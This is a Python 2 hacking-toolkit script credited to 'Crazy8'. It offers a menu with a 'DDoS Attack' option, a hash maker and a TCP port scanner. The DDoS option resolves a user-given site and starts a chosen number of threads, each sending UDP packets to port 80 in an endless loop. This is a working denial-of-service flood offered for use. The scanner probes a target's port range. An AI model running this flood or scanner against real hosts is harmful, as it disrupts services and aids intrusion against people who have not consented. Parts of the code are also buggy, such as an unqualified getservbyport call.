import os , hashlib , thread , time , socket , sys , pyfiglet

os.system("clear")
os.system("clear")
os.system("clear")
os.system("clear")

class color:

    purple = '\033[34m'
    blue = '\033[94m'
    Green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

time.sleep(3)

print color.red +  '''

       ,#############################,
       ################################
      ##################################
      ###                            ###
      ###   $$$$$            $$$$$   ###
      ###   $$$$$            $$$$$   ###
      ###    ```      """     ```    ###
       ###           """""          ###
       ###           """""          ###
        ###                        ###
         ###                      ###
          ###                    ###
             ====================
             =||||||||||||||||||=
             =------------------=
             =||||||||||||||||||=
             ====================

''' + color.end

print color.purple + ''' Code By : Crazy8          Telegram : @LightGreen_heart
''' + color.end

time.sleep(3)

print color.yellow +  '''

[1] DDoS Attack

[2] Hash Maker

[3] Port Sccaner

[99] Exit

''' + color.end

input1 = raw_input(color.Green + " CH8 > " + color.end)
print "   "

if input1 == "1":

 site = raw_input(color.blue + "Enter your site url => ")
 print "   "
 thread_count = input("Enter your thread => ")

 ip = socket.gethostbyname(site)

 UDP_PORT = 80
 MESSAGE = "Crazy8"
 print "UDP target IP:", ip
 print "UDP target port:", UDP_PORT
 time.sleep(3)

 def dos(i):
        while True:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(MESSAGE, (ip, UDP_PORT))
                        print "Packet Sent"

 for i in xrange(thread_count):
        try:
         thread.start_new_thread( dos , ("Thread-"+str(i),) )
        except KeyboardInterrupt:
                        sys.exit(0)
 while 1:
  pass

if input1 == "2" :

 print color.blue + "   "

 result = pyfiglet.figlet_format('Hash Maker' , font = 'slant')

 print result
 print color.purple + ''' Code By : Crazy8                 Telegram : @LightGreen_heart
'''
 time.sleep(3)

 print color.yellow +  '''

[1] MD5

[2] SHA-1

[3] SHA-224

[4] SHA-256

[99] EXIT

''' + color.end
 time.sleep(2)
 inputer = raw_input(color.red + "Enter Your Text for hashing : " )

 print "   "

 model = raw_input(" enter the number : ")
 print "   "

 if model == "1":

  md5 = hashlib.md5()

  md5.update(inputer)

  print color.Green + "{+} md5 your password is >>> ",md5.hexdigest()

  print "    "

 if model == "2":

  sha1 = hashlib.sha1()

  sha1.update(inputer)

  print color.Green + "{+} sha1 your password is >>> ",sha1.hexdigest()

  print "   "

 if model == "3":

  sha224 = hashlib.sha224()

  sha224.update(inputer)

  print color.Green + "{+} sha224 Your Password is >>> " , sha224.hexdigest()

  print "  "

 if model == "4":

  sha256 = hashlib.sha256()
  sha256.update(inputer)
  print color.Green + "sha-256 Your Password is >>> " , sha256.hexdigest()

 if model == "99":

  os.system("clear")

if input1 == "3":

 host = raw_input(color.Green + "Enter Your Target ip : ")
 print "   "
 range1 = int(input("Enter range1 Port : "))
 print "   "
 range2 = int(input("Enter range2 Port : "))

 print "   "
 for i in range(range1,range2):

               s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

               s.settimeout(1)

               re = s.connect_ex((host,i))

               if re == 0:

                    service = getservbyport(i)

                    print "[+] Port : " ,service,i,"open"

               else :

                    print "[+] Port : " , i, "close"
if input1 == "99":

 os.system("clear")
